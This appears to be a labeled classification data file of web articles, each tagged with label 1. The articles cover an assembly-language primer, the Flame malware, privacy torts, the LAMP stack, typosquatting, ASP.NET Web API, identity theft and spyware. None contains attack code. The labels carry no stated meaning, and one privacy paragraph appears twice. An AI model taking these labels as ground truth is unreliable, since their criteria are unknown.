doesn’t support VBA either so won’t run although the professional version does support it and might work. Even the free Excel Viewer provided by Microsoft doesn’t work, so it appears that sadly the TaskManager.xls tool is only compatible with the real Microsoft Excel.", "label": 1}
{"text": "I’m still following the Assembly Primer for Hackers from Vivek Ramachandran of SecurityTube in preparation for Penetration Testing with BackTrack. In this review I’ll cover data types and how to move bytes, numbers, pointers and strings between labels and registers.\nVariables (data/labels) are defined in the .data segment of your assembly program. Here are some of the available data types you’ll commonly use.\nData types in assembly; photo credit to Vivek Ramachandran\n# Demo program to show how to use Data types and MOVx instructions .data HelloWorld: .ascii \"Hello World!\" ByteLocation: .byte 10 Int32: .int 2 Int16: .short 3 Float: .float 10.23 IntegerArray: .int 10,20,30,40,50 .bss .comm LargeBuffer, 10000 .text .globl _start _start: nop # Exit syscall to exit the program movl $1, %eax movl $0, %ebx int $0x80\nMoving numbers in assembly\nIntroduction to mov\nThis is the mov family of operations. By appending b, w or l you can choose to move 8 bits, 16 bits or 32 bits of data. To demonstrate these operations, we’ll be using the example above.\nMoving a byte into a register\nmovb $0, %al\nThis will move the integer 0 into the lower 8 bits of the EAX register.\nMoving a word into a register\nmovw $10, %ax\nThis will move the integer 10 into the lower 16 bits of the EAX register.\nMoving a word into a register\nmovl $20, %eax\nThis will move the integer 20 into the 32-bit EAX register.\nMoving a word into a label\nmovw $50, Int16\nThis will move the integer 50 into the 16-bit label Int16.\nMoving a label into a register\nmovl Int32, %eax\nThis will move the contents of the Int32 label into the 32-bit EAX register.\nMoving a register into a label\nmovb %al, ByteLocation\nThis will move the contents of the 8-bit AL register into the 8-bit ByteLocation label.\nAccessing memory locations (using pointers)\nIn C we have the concept of pointers. A pointer is simply a variable that points to a location in memory. Typically that memory location holds some data that is important to us and that’s why we’re keeping a pointer to it so we can access the data later. This same concept can be achieved in assembly.\nMoving a label’s memory address into a register (creating a pointer)\nmovl $Int32, %eax\nThis will move the memory location of the Int32 label into the EAX register. In effect the EAX register is now a pointer to the data held by the Int32 label. Notice that we use movl because memory locations are 4 bytes. Also notice that to access the memory location of a label you prepend the $ character.\nDereferencing a pointer (accessing the contents of a memory address)\nMoving a word into a dereferenced location\nmovl $9, (%eax)\nThis will move the integer 9 into the memory location held in EAX. In other words, if this were C, %eax would be considered a pointer and (%eax) would be the way we dereference that pointer to change the contents of the location it points to. The equivalent in C would like something like this:\nint Int32 = 2; int *eax; eax = &Int32; *eax = 9;\nThe only difference in the C example is that we had to define eax as an int pointer before we could copy the address of Int32. In assembly we can just copy the address of Int32 directly into the EAX register, circumventing the need for an additional variable. But line 4 of this C example is the equivalent of the assembly example shown above.\nSo to clarify one more time, EAX does not change at all in this example; EAX still points to the same location! However, the data at that location has changed. So if EAX contains the location of the Int32 label, then Int32 now contains 9. So it’s Int32 that has changed, not EAX.\nNotice that we use the parentheses to access the memory location stored in the register (dereference the pointer).\nMoving a dereferenced value into a register\nmovl (%eax), %ebx\nIn effect the EBX register is now a pointer to the data held by EAX. Notice that to access the memory location of the register we’re again enclosing the register name in parentheses.\nMoving strings in assembly\nI can imagine that reading this you might be thinking, “hey, strings are just bytes of data so why can’t I just move them using the same instructions I just learned?” And the answers to that questions is you can! The problem is that strings are oftentimes much larger. A string might be 1 byte, 5 bytes, or 100 bytes. And none of mov instructions discussed above cover anything larger than 4 bytes. So let’s discuss the string operations that are available to alleviate the pains of copying large strings of data.\nA key difference between the standard mov operations and the string series of movs, stos and lods operations is the number of operands. With mov, you specify the source and destination via 2 operands. However, with the movs instructions, the source and destination addresses are placed into the ESI and EDI registers respectively. And with stos and lods, the operations interact directly with the EAX register. This will become more clear with some examples.\nThe DF flag\nDF stands for direction flag. This is a flag stored in the CPU that determines whether to increment or decrement a string’s memory address when string operations are called. When DF is 0 (cleared) the addresses are incremented. When DF is 1 (set) the addresses are decremented. In our examples the DF flag will always be cleared.\nThe usefulness of the DF flag will make more sense in the examples.\nClearing the DF flag\nDF is set to 0. Addresses are incremented where applicable.\nSetting the DF flag\nDF is set to 1. Addresses are decremented where applicable.\nIn the example below, the following variables have been defined:\n.data HelloWorldString: .asciz \"Hello World of Assembly!\" .bss .lcomm Destination, 100\nmovs: Moving a string from one memory location to another memory location\nsource: %esi; should contain a memory address where the data to be copied resides; the data at this address is not modified, but the address stored in the %esi register is incremented or decremented according to the DF flag destination: %edi; should contain a memory address where the data will be copied to; after copying, the address stored in the %edi register is incremented or decremented according to the DF flag\nmovsb: move a single byte\nmovsw: move 2 bytes\nmovsl: move 4 bytes\nmovl $HelloWorldString, %esi movl $Destination, %edi movsb movsw movsl\nIn this example, we first move the address of HelloWorldString into the ESI register (the source string). Then we move the address of Destination into EDI (the destination buffer).\nWhen movsb is called, it tells the CPU to move 1 byte from the source to the destination, so the ‘H’ is copied to the first byte in the Destination label. However, that is not the only thing that happens during this operation. You may have noticed that I pointed out how the address stored in the %esi and %edi registers are both incremented or decremented according to the DF flag. Since the DF flag is cleared, both %esi and %edi are incremented by 1 byte.\nBut why is this useful? Well, what it means is that the next string operation to be called will start copying from the 2nd byte of the source string instead of the first byte. In other words, rather than copying the ‘H’ a second time, we’ll start by copying the ‘e’ in the HelloWorldString instead. This is what makes the movs series of operations far more useful than the mov operations when dealing with strings.\nSo, as you might imagine, when calling movsw the next 2 bytes are copied and Destination now holds “Hel”. And finally the movsl operation copies 4 bytes into Destination, which makes it “Hello W”.\nOf course, the memory locations held in both %esi and %edi have now been incremented by 7 bytes each. So the final values are..\n%esi: $HelloWorldString+7 %edi: $Destination+7 HelloWorldString: \"Hello World of Assembly!\" Destination: \"Hello W\"\nlods: Moving a string from a memory location into the EAX register\nsource: %esi; should contain a memory address where the data to be copied resides; the data at this address is not modified, but the address stored in the %esi register is incremented or decremented according to the DF flag destination: %eax; the contents of this register are discarded because the data is copied directly into the register, NOT to any memory address residing in the register; no incrementing or decrementing occurs because the destination is a register and not a memory location\nlodsb: move a single byte\nlodsw: move 2 bytes\nlodsl: move 4 bytes\nstos: Moving a string from the EAX register to a memory location\nsource: %eax; the contents of this register are copied, NOT the contents of any memory address residing in the register; no incrementing or decrementing occurs because the source is a register and not a memory location destination: %edi; should contain a memory address where the data will be copied to; after copying, the address stored in the %edi register is incremented or decremented according to the DF flag\nstosb: move a single byte\nstosw: move 2 bytes\nstosl: move 4 bytes\nrep: Repeating an operation so you can move strings more easily\nThis will continue executing the movsb operation and decrementing the ECX register until it equals 0. So if you wanted to copy a string in its entirety, you could follow this pseudo-code:\n* set ESI to the memory address of the source string * set EDI to the memory address of the destination string * set ECX to the length of the source string * clear the DF flag so ESI and EDI will be incremented for each call to movsb * call rep movsb\nmovl $HelloWorldString, %esi movl $DestinationUsingRep, %edi movl $25, %ecx # because HelloWorldString contains 24 characters + a null terminator cld rep movsb\nHere we have movsb being called 25 times (the value of ECX). Because movsb increments both the ESI and EDI register you don’t have to concern yourself with the memory handling at all. So at the end of the example, the values are..\n%esi: $HelloWorldString+25 %edi: $Destination+25 %ecx: 0 DF: 0 HelloWorldString: \"Hello World of Assembly!\" Destination: \"Hello World of Assembly!\"\nMore to Come\nI hope you enjoyed reviewing data types and mov operations. Stay tuned for more assembly tips!", "label": 1}
{"text": "(ARA) - Traditionally, the term “war zone” elicits images of tanks, gunfire and military personnel. However, as technology evolves, so do the weapons associated with the art of warfare. Most recently, the battleground has moved online, with the introduction of a new computer malware threat known as “Flame.”\nFlame steals information from e-operations of certain nation states – making it a vital threat to both governments and military units. Based on the way Flame works, it can be classified as a “cyber weapon,” according to Kaspersky Lab, a Russian anti-virus firm.\nWeb attacks cost businesses $114 billion each year, according to a 2011 study conducted by Symantec. And as more business, government and military institutions store classified information online, the probability of an attempted attack by these new forms of cyber-weaponry increases. Given the likelihood for future security breaches, the need for professionals with the skills required to protect those at risk for such forms of online espionage is amplifying. The U.S. Bureau of Labor Statistics Occupational Outlook Handbook reports that by the year 2020, demand for cyber security experts will increase by 28 percent.\nMuch like the way the military and police serve and protect our country and its citizens, cyber security experts play a crucial role in protecting an institution’s network and information from attacks. These professionals, known as computer forensics experts, also analyze the electronic evidence, and in some cases identify and serve as expert witnesses to help prosecute the criminals responsible.\nBachelor’s degree programs such as computer information systems (CIS) help prepare students for this role. Many programs allow students to concentrate their studies in a variety of cyber security specialties. For example, students focusing on computer forensics will learn the skills necessary to handle the electronic evidence of criminal cases and how to identify and prosecute criminals.\nAt DeVry University, students enrolled in the Computer Information Systems bachelor’s degree program can pursue a cyber security specialization in computer forensics that allows them to gain understanding of the diversity of computer crime, and the laws and principals concerned with computer forensics and electronic evidence. They also learn how to discover data that resides in a computer system, and how to recover deleted, encrypted or damaged file information.\n“Technical knowledge is only one piece of the skillset puzzle for cyber security practitioners,” says Dr. Ahmed Naumaan, national dean for the College of Engineering & Information Sciences at DeVry University. “Creativity and the ability to think outside the box play a pertinent role, as those in this field must be able to take on the mindset of the hackers they protect against.”\nThe many forms of online assault will continue to evolve. As governments, businesses and other institutions increasingly become targets of online warfare, the demand for those armed with the competencies to successfully defend against them will grow.", "label": 1}
{"text": "Invasion of Privacy\nThe right of privacy is a common-law (court-made) cause of action that is a fairly new legal development. The U.S. Constitution contains no direct references to the right of privacy. There are few statutes that affect privacy and most invasion of privacy lawsuits that publishers may face are of the common-law type. An action for invasion of privacy is actually comprised of four distinct torts (legal wrongs). These are: intrusion upon seclusion; appropriation of name or likeness; publicity given to private life; and publicity placing the person in a false light. Each separate cause of action is addressed below. Note: to sue successfully for invasion of privacy, a plaintiff only has to prove one of the four torts, not all of the four torts.\nThe right of privacy competes with the freedom of the press as well as the interest of the public in the free dissemination of news and information, and these permanent public interests must be considered when placing the necessary limitations upon the right of privacy. Pennsylvania courts have held that an action based on such right must not become a vehicle for establishment of a judicial censorship of the press.\nBack to top.\nIntrusion Upon Seclusion\nOne who intentionally intrudes, physically or otherwise, upon the solitude or seclusion of another or his private affairs or concerns, is subject to liability to the other for invasion of his privacy, if the intrusion would be highly offensive to a reasonable person.\nTo be liable for intrusion upon seclusion, the plaintiff must prove the following elements:\n1. Invasion of a secluded place or privacy: the Defendant (the offender) must invade the Plaintiff's (the person suing) personal or private space. The definition of this invasion is very broad. Invasion may be:\nby physical intrusion into a place where the plaintiff has secluded himself.\nby use of the defendant's senses to oversee or overhear the plaintiff's private affairs (such as eavesdropping or spying with a telescope), or\nsome other form of investigation or examination into plaintiff's private concerns (such as illegally obtaining someone's credit report).\n2. Objectionable intrusion: the intrusion must be of a type that would be highly offensive to the ordinary reasonable person.\n3. Invasion of private affairs or matters: the interference with the plaintiff's privacy must be substantial (however, if the event reported occurs in public, there is no expectation of privacy).\nExamples of intrusion upon privacy include placing microphones or cameras in someone's bedroom or hacking into their computer. However, where the information that is reported pertains to the public interest as well as a party's private interest, that individual's right of privacy will be weighed against the public interest. If the event being reported is in the public interest (a newsworthy event), it will, in all likelihood, be immune to an invasion of privacy lawsuit. An example of this would be a car accident. Although it involves the personal affairs of a few people (or even only one person), the accident is reportable because it is a newsworthy event. Therefore, a person cannot sue a newspaper for invasion of privacy over a story about a car accident that includes the driver's name. Photographs taken in public are also not violative of one's privacy.\nBack to top.\nAppropriation of Name or Likeness\nAppropriation of name or likeness occurs when someone appropriates the name or likeness of another for their own use or benefit. Action for misappropriation of right of publicity protects against commercial loss caused by appropriation of an individual's personality for commercial exploitation. It gives the individual exclusive right to control the commercial value of his or her name and likeness to prevent others from exploiting that value without permission. It is similar to a trademark action with the person's likeness, rather than the trademark, being the subject of the protection.\nCourts have denied plaintiffs lawsuits unless there is a finding that the defendant obtains an economic benefit from using the plaintiff's name. Additionally, the courts are unlikely to find that there has been an appropriation of the plaintiff's likeness unless the unauthorized use was part of an advertisement or a promotion.\nIf such an appropriation is for a newsworthy event, the person's right to privacy is not violated. An example of this is if a photograph of someone patronizing a new restaurant is published as part of a story publicizing the opening of the restaurant. The patron cannot sue the newspaper for appropriation of name or likeness because the photograph is being used for a newsworthy event. However, if a store is using someone's picture to advertise a new line of clothes, and they have not received permission from that person to use the picture, that person's likeness has been wrongly appropriated.\nBack to top.\nPublicity Given to Private Life\nOne who gives publicity to a matter concerning the private life of another is subject to liability to the other for invasion of his privacy, if the matter publicized is of a kind that:\n1. would be highly offensive to a reasonable person, and\n2. is not of legitimate concern to the public.\nThe main determination in a publicity given to private life lawsuit is whether the matter being publicized is public or private. If the matter is one of public concern, there is no invasion of privacy. First Amendment rights protect the publication of items of legitimate public interest. However, if the matter is not one of public concern, and it is one that people would find offensive, there is an invasion of privacy. An example of publicity given to private life would be publicizing the fact that your neighbor has failed to pay his credit card bill for three months.\nSometimes there is difficulty in determining whether something really is of legitimate public concern. Courts have held that a claim that a person violated the law is relevant and newsworthy, even though it was latter proven that the substance of the complaint was false. The example of a drunk-driving one-car accident is also illustrates this point. Although the driver may have an interest in keeping the fact that he was driving while intoxicated private, the accident occurred in public and is a newsworthy event. The public's interest in knowing about the accident outweighs the driver's interest in keeping the accident private. Additionally, matters that are of public record are not protected. If a journalist publishes a story disclosing facts that were obtained from a police press release or a court opinion, the matter is of public record and no lawsuit for publicity given to private life will be successful.\nPublic figures (those persons who, by their accomplishments or place in life, give the public a legitimate interest in their affairs, such as politicians, professional athletes, and even personal injury claimants) face a somewhat lessened right to privacy because more of their actions are of legitimate public concern than they would be if the public figure were an ordinary person. Because of this lessened expectancy of privacy, a newspaper can publish a biography of a public figure without fear of being sued for invasion of privacy. No permission is needed to do such a story. Additionally, the newspaper can include some facts that would otherwise be an invasion of privacy for a person who is not a public figure. Care must be taken that these otherwise private facts are within the scope of the story. Examples of these facts would be a public figure's familial background, associates, or specific events in their life that shape them into the person that they are, or that shed light as to their guilt or innocence. Public figures (those persons who, by their accomplishments or place in life, give the public a legitimate interest in their affairs, such as politicians, professional athletes, and even personal injury claimants) face a somewhat lessened right to privacy because more of their actions are of legitimate public concern than they would be if the public figure were an ordinary person. Because of this lessened expectancy of privacy, a newspaper can publish a biography of a public figure without fear of being sued for invasion of privacy. No permission is needed to do such a story. Additionally, the newspaper can include some facts that would otherwise be an invasion of privacy for a person who is not a public figure. Care must be taken that these otherwise private facts are within the scope of the story. Examples of these facts would be a public figure's familial background, associates, or specific events in their life that shape them into the person that they are, or that shed light as to their guilt or innocence.\nBack to top.\nPublicity Placing the Person in a False Light\nOne who gives publicity to a matter concerning another that places the other before the public in a false light is subject to liability to the other for invasion of his privacy if the false light in which the other was placed would be highly offensive to a reasonable person. Examples include a newspaper publishing an innocent person's picture as part of a story about convicted felons or including reporting that someone was involved in a domestic dispute when, in fact, there was no such dispute. Publicly placing a person in a false light also includes falsely stating someone's views, such as saying that someone is a member of the Ku Klux Klan.\nAn important exception is when the published matter is in the public interest (newsworthy), such as an item dealing with an accident or the background of a candidate for public office. When the published matter is in the public interest, the plaintiff must show that the publisher acted with malice (that they either had a reckless disregard for the truth or they knew the report was false but published it anyway). For example, if a newspaper published a story reporting that a candidate for mayor embezzled money from his previous employer, but never attempted to verify the accuracy of the information, the newspaper can be held liable for publicly placing the candidate in a false light. It is important to keep in mind that malice can be found if the information published is without probable cause or the newspaper never checked for truth by the means at hand.\nFor more information about malice, see:Libel\nBack to top.\nSpecial Notes on Invasion of Privacy\nFor a successful lawsuit, the plaintiff must prove that the defendant's actions caused his or her privacy to be invaded. Therefore, the newspaper cannot be sued for invasion of privacy if a newspaper publishes a story based upon a report that was made by someone who invaded the plaintiff's privacy. Note: the newspaper may be held responsible if the newspaper encourages someone to invade the plaintiff's privacy. Additionally, in some invasion of privacy cases, the newspaper may also be held liable for libel. Unlike libel, truth is not a defense for invasion of privacy.\nOnly the plaintiff holds the right to privacy. It is a personal right. It does not survive the plaintiff (the defendant cannot be sued for invasion of privacy actions that occur after the death of the person whose privacy was invaded), nor can it be asserted on behalf of family members. Invasion of privacy lawsuits cannot be brought by, or on behalf of, corporations.\nSuccessful plaintiffs may recover damages for harm to their interest in privacy, mental/emotional distress, and special damages caused by the invasion of privacy.\nBack to top.", "label": 1}
{"text": "Four years ago, LAMP (Linux OS, Apache Web server, MySQL database and Perl, Python and PHP languages) was the open stack of choice, especially for Web servers.\nIn the early part of the decade, when MySQL started promoting LAMP to boost its own visibility as the M in the stack, the acronym grew in popularity.\nToday, however, LAMP is like an illuminated sign with only the A still visible. While the existence of an all-open source application stack remains helpful, there are so many choices beyond the original group that the LAMP acronym has fallen into disuse, analysts say. Even Linux is not sacrosanct, with companies occasionally substituting Windows in an otherwise all-open source stack; the Apache Web server is the only LAMP component whose position remains undisputed, observers say.\n\"It's never been a specific acronym,\" said Mark Driver, at research vice president at Stamford, Conn.-based Gartner Inc..\n\"LAMP always represented the idea of an open stack. It shouldn't be taken too literally.\"\nAnne Thomas Manes, vice president and research director of Midvale, Utah-based Burton Group, agreed.\n\"LAMP stands for completely open source,\" she said. \"And it's simpler, lighter-weight programming than Java or .NET, and it's nice for Web sites.\"\nIndeed, with the P, LAMP's clarity began eroding. Initially, the P stood for Perl, the most popular language for creating Web pages. But it was later joined by PHP, which is easier to write because the program runs inside Web pages rather than on a server. Though PHP has in turn has created an \"epidemic of security issues,\" according to Ed Sawicki, a veteran IT consultant based in Portland, Ore. Now Python is more popular, but programmers use Ruby and LISP, he said.\nAs for databases, MySQL may be the most popular open source choice, with simplicity and speed in its favor, Sawicki said. Still, Postgres is better at more complex functions; so some companies use both databases, he said.\nThe Ruby language on the Rails framework is generally safer than PHP and Python, whereas Python is more complex, and typically used by programmers who are aware of potential security pitfalls, she said.\n\"The beauty of LAMP is that it's an a la carte technology,\" added Driver. \"And it's light years ahead of where it was two years ago.\"", "label": 1}
{"text": "- Why are these threats possible?\nBecause computers are little more than tools. The term \"computer\" is very descriptive despite all of the abstraction that we attempt to layer on top of them; it is a device that \"computes\", plain and simple. Whether, at any given nanosecond, it is computing the color of a pixel in a UI, the address of data in its memory, etc, it is no more or less than an incredibly fast binary calculator hooked up to a lot of peripheral components that provide inputs to and outputs from the basic programming the CPU is currently churning its way through.\nGiven that, the question of \"why\" has a simple answer; tools can be used for good or ill. Hammers can pound nails or skulls. Saws can cut wood or flesh. And computers can sequence DNA to find the cure for cancer, or steal your bank account information.\n- Why doesn't the computer just do the things it is supposed to?\nIt does. It does exactly what it is told to do by the program that it is currently executing. The problem is that the program the computer is currently executing isn't necessarily something you told it to execute explicitly by the stroke of a key or the click of a mouse. For a very long time now, we've used multiple layers of software (and hardware) to allow for modularity; any computer can have any hardware plugged into it, and run any program to work with it (at least that's the theory). More recently we have invented layers to allow a computer to juggle many programs at once. These layers of abstraction such as the OS, virtual machines, daemons (services), etc, which hide what the computer is really doing on any given clock, can be manipulated by an attacker to run software without your conscious knowledge.\n- Why do some people write malware, instead of programs with a constructive purpose beyond doing damage and violating the law?\n...some men aren't looking for anything logical, like money. They can't be bought, bullied, reasoned, or negotiated with. Some men just want to watch the world burn. - Alfred Pennyworth, The Dark Knight\nFor most \"black hats\", the mayhem they cause is fun, it's entertaining, the same way you or I would enjoy a video game in a completely sandboxed environment. They, however, are doing things in the real world. Same layer of digital separation between you and the consequences of your actions, with the added thrill of knowing it's real.\n- Does computer insecurity exist because of the nature of computers?\nTo a point, yes. Computers are powerful, but they are extremely dumb. They require humans to do their thinking for them, to design them in a way that is difficult to subvert, to program them in a way that is difficult to subvert, and to use them in a way that is difficult to subvert. The inherent difficulty of this is similar to the inherent difficulty (maybe the impossibility) of designing a \"completely foolproof system\":\nA common mistake that people make when trying to design something completely foolproof is to underestimate the ingenuity of complete fools. - Douglas Adams\nIn both cases, you're very simply trying to pre-emptively outsmart someone willing to spend a lot of time and effort finding a way to misuse what you're designing once the finished product has left your hands. You effectively have to come up with the same ideas that the other person would have, and incorporate mechanisms to defeat that line of thinking. The more complex the system is internally, the more of those ideas become possible, and the less likely you are to have thought of everything. The more you put in place to prevent misuse, the more complexity you add. It's a vicious cycle.", "label": 1}
{"text": "How many times have you typed a wrong internet address into your web browser? It must have happened to you at least once. Maybe instead of “Facebook” you typed “Fcebook” while rushing to access your Facebook profile?\nYou’d think that such an honest mistake doesn’t cost you anything. After all, you do no harm. But with all the cybercriminals out there looking for new opportunities to make some easy money, mistyping the name of a popular website might cost you your internet security.\nIf you mistype the address of a website into your browser, you could end up on a malicious website. Once landed, you might get tricked into downloading malicious software to your computer or handing over personal information, such as credit card details. Cybercriminals set up these fake websites, hoping to “capitalize” on your mistakes.\nWhat is typosquatting?\nThe fraudulent web practice mentioned above is called “typosquatting”. It is a form of cybersquatting, an illegal web practice also known as “domain” or “URL squatting”. The US and other countries even have a law against it. In the US it’s called “the Anticybersquatting Consumer Protection Act”.\nCybersquatting basically refers to the action of registering, trafficking in, or using the name of an existing website to profit from the goodwill of a trademark that belongs to someone else.\nSometimes, the ill-intended third-parties behind this kind of fraud – cybersquatters – register misspelled versions of popular trademarked names that coincide with common misspellings made by web users. In such cases, if you happen to type one of those versions into your browser, you’re directed to their site (for example: www.example.com may be used as www.exmple.com). At this point, your internet security might be greatly compromised. This is typosquatting and has happened with popular brands like: Twitter – www.twtter.com, Wikipedia – www.wikapedia.com, Craiglist – www.craigilist.com, Apple – www.pple.com, Google – www.goole.com and more.\nWhat do typosquatters want?\n- Compete with the popular sites in question for web traffic and earn money through advertisements; in this case, typosquatters are not putting at risk your internet security, but they are taking advantage of your good faith. Their real victims are the companies whose names are used as bait.\n- Trick you into downloading spyware or other type of malware to your computer. If you don’t have proper antivirus protection, they might breach your internet security. For example, once you get on the respective site, a pop-up window might warn you that your computer is infected and urge you to download an antivirus program they provide. If you fall for the scam, what you actually download is malware.\n- Get hold of your personal information – usernames, passwords, credit card details, as part of a phishing scam. The site you land on might offer you fake discounts or giveways, in exchange for your personal details.\n- Direct you to adult, dating sites, or other sites you had no intention of visiting.\nHow to avoid typosquatting dangers:\n- Be very careful with what you type in to your web browser. Always type in the correct names of the sites you want to visit and make sure your kids do the same. You don’t want them ending up on dating sites or downloading some form of malware that can compromise your entire family’s internet security.\n- When you’re not sure of the correct spelling of the website name, do not type it in the browser address bar directly. Use a trusted search engine instead, like Google, Bing and Yahoo!, to get a thorough list of search results. In this case, it’s best you have an effective Safe Browsing tool, like the one in BullGuard Internet Security 12, to flag out phishing, virus-infected and other types of malicious websites.\n- Get a genuine and comprehensive internet security suite to protect you from phishing attempts, viruses, spyware and other types of malware. BullGuard’s internet security software comes with a dual antivirus engine that spots known and yet unknown malware, as well as an antiphishing tool and a bunch of other cool internet security features.", "label": 1}
{"text": "An Introduction to ASP.NET Web API\nMicrosoft recently released the ASP.NET MVC 4.0 beta and along with it, the brand spanking new ASP.NET Web API. Web API is an exciting new addition to the ASP.NET stack that provides a new, well-designed HTTP framework for creating REST and AJAX APIs (API is Microsoft’s new jargon for a service, in case you’re wondering). Although Web API currently ships and installs with ASP.NET MVC 4, you can use Web API functionality in any ASP.NET project, including WebForms, WebPages and MVC or none of the above. You can also self-host Web API in your own applications.\nPlease note that this article is based on pre-release bits of ASP.NET Web API (pre-RC) and the API is still changing. The samples are built against the latest snapshot of the CodePlex ASP.NET Web Stack Source and some of the syntax and functions might change by the time Web API releases. Overall concepts apply, and I’ve been told that functionality is mostly feature complete, but things are still changing as I write this. Please refer to the latest code samples on GitHub for the final syntax of the examples.\nWhat’s a Web API and Why Do We Need It?\nMost mobile devices, like phones and tablets, run apps that use data retrieved from the Web over HTTP.\nThe .NET stack already includes a number of tools that provide the ability to create HTTP service backends. There’s WCF REST for REST and AJAX, ASP.NET AJAX Services purely for AJAX and JSON, and you can always use plain HTTP Handlers for any sort of response but with minimal plumbing. You can also use plain MVC Controller Methods or even ASP.NET WebForms pages to generate arbitrary HTTP output.\nAlthough all of these can accomplish the task of returning HTTP responses, none of them are optimized for the repeated tasks that an HTTP service has to deal with. If you are building sophisticated Web APIs on top of these solutions, you’re likely to either repeat a lot of code or write significant plumbing code yourself to handle various API requirements consistently across requests.\nA Better HTTP Experience\nASP.NET Web API differentiates itself from these other solutions in that it was built from the ground up around the HTTP protocol and its messaging semantics. Unlike WCF REST or ASP.NET AJAX with ASMX, it’s a brand new platform rather than bolted-on technology that is supposed to work in the context of an existing framework.\nWeb API is meant to handle any kind of HTTP input and produce output and status codes using the full spectrum of HTTP functionality available. There’s much-improved support for content negotiation based on HTTP Accept headers, with the framework capable of detecting content that the client sends and requests and automatically serving the appropriate data format in return. Many of the features favor convention over configuration, making it much easier to do the right thing without having to explicitly configure specific functionality.\nAlthough previous solutions accomplished this using a variety of WCF and ASP.NET features, Web API combines all this functionality into a single server-side HTTP framework that intrinsically understands the HTTP semantics and subtly drives you in the right direction for most operations. And when you need to customize or do something that isn’t automatic, there are overrides for most behaviors, and even many low-level hook points that allow you to plug-in custom functionality with relatively little effort.\nASP.NET Web API differentiates itself from existing Microsoft solutions in that it was built from the ground up around the HTTP protocol and its messaging semantics.\nWeb API also requires very little in the way of configuration so it’s very quick and unambiguous to get started. To top it all off, you can also host the Web API in your own applications or services.\n- Above all, Web API makes it extremely easy to create arbitrary HTTP endpoints in an application without the overhead of a full framework like WebForms or ASP.NET MVC. Because Web API works on top of the core ASP.NET stack, you can plug Web APIs into any ASP.NET application.\nBy: Rick Strahl\nRick Strahl is president of West Wind Technologies in Maui, Hawaii. The company specializes in Web and distributed application development and tools, with focus on Windows Server Products, .NET, Visual Studio, and Visual FoxPro. Rick is the author of West Wind Web Connection, West Wind Web Store, and West Wind HTML Help Builder. He’s also a C# MVP, a frequent contributor to magazines and books, a frequent speaker at international developer conferences, and the co-publisher of CoDe Magazine. For more information please visit his Web site at www.west-wind.com or contact Rick at firstname.lastname@example.org.", "label": 1}
{"text": "Identity theft occurs more frequently in the United States than people want to believe. According to the U.S. Department of Justice, identity theft and identity fraud are referred to as \"all types of crime in which someone wrongfully obtains and uses another person's personal data in some way that involves fraud or deception for economic gain.\"\nThe Federal Trade Commission compiles a report every year for identity theft complaints in the United States. These complaints increased more than 78 percent between 2009 and 2011. With identity theft becoming an increasing problem, Professor Duanne J. Thompson, the acting program chair of Criminal Justice at Argosy University, Atlanta, offers some advice for consumers to take in order to protect themselves from identity theft:\n1. Protect your identity like you would protect your house.\n2. Don't give out sensitive information such as Social Security information. In most states it is illegal for a business to ask for your Social Security number for transactions.\n3. If purchasing on the Web, make sure you know who you are buying from and that the site is secure.\n4. Don't fall for phishing scams. Legitimate websites will never ask for your password or account information. If in doubt contact the vendor before you send your information.\nThompson also says that consumers should be aware that they have a right to have one free credit report from every credit clearing house, such as Equifax, TransUnion and Experian, at least once a year. In some states, consumers are allowed a free credit report at least twice a year. Consumers should look at the information from their reports and ensure that the information is correct and accurate. They should look specifically at each credit statement every month for suspicious fraudulent activity.\nThe bigger question is what a consumer should do if they find themselves victims of identity theft. Thompson suggests to first notify your credit vendor that your card has been compromised and that there is an individual acting as you. Consumers should then call their local police department and file a report. Afterward, gather as much information as possible about your accounts and all transactions to help aid the investigator in the case. Once the police report is obtained, file an identity theft claim with all three credit clearing houses (Equifax, TransUnion and Experian). All three credit clearing houses will require a copy of the local police report and all the information you have supporting the theft.\nWith the rise of online trends such as social media and online banking, consumers must be more vigilant about their identity as these trends lead to more and more avenues for identity theft criminals. The best way a consumer can protect their identity to simply be smart and be aware of their financial records.\nGateHouse News Service", "label": 1}
{"text": "An individual who uses a computer with an Internet connection pretty much practices caution when downloading programs from the Internet and email because of the threat of viruses and worms. These malicious program codes and programs can cause your system to become unstable and worse yet, after it has spread within your system, it further infects other systems connected to yours.\nThis is why any sensible computer user has anti virus programs installed in one’s computer for protection against attacks from viruses and worms that proliferate the Internet. The good thing about viruses and worms is the fact that it is easier to spot them trying to get into your system. For instance, a virus or worm can try to enter your system through a suspicious attachment usually from an unknown source.\nBy now, most Internet users know better than to open suspicious attachments. Also, rigorous anti virus programs can scan attachments before you can open them so that your risk against viruses and worms are properly managed.\nHowever, as an Internet user, you have more to worry about than viruses and worms. Unfortunately, anti virus programs are not designed to detect other types of threats and if you are not careful, you may unwittingly install adware and spyware into your system and once this happens, uninstalling these programs can become problematic. For one thing, most spyware can go undetected in your system.\nYou will continue on your regular computer and Internet habits without realizing that your privacy is immensely violated and your security is greatly hindered.\nSince spyware can go undetected and you can continue to use your computer and the Internet as usual, there is no need to worry about uninstalling spyware, right?\nSpyware in mild cases infringes on your privacy because it can track and take note of your usage patterns and these information are reported back to the company that created the spyware so that they can build marketing profiles. More than that though, some spyware have the ability to register and take note of key strokes, scan documents within your computer‘s hard drive, and can steal your passwords and other sensitive information that can make you the victim of identity theft and other situations where your personal information can be used to compromise your security.\nOn the other hand, adware is used by companies to infect your computer with unsolicited ads. The most problematic kinds are the ones that indiscriminately pop ads on to your screen even if you are not viewing their site or using the parent program that launched the adware. In fact, in some cases, adware continues to work into your system long after you uninstalled the program it came bundled with.\nGiven the security risks, the invasion of your right to privacy, and the annoying effects of spyware and adware, you will be wise to uninstall these programs from your computer. However, to uninstall adware and spyware from your system is not such a simply task.\nFor one thing, companies that proliferate the Internet with spyware and adware go to great lengths to ensure that uninstalling them from your system can be difficult. For instance, in most cases, you will be unable to use legitimate software if you attempt to uninstall the adware or spyware it comes bundled with. Adware and spyware are usually bundled with legitimate freeware or shareware and cannot run independently of each other.", "label": 1}
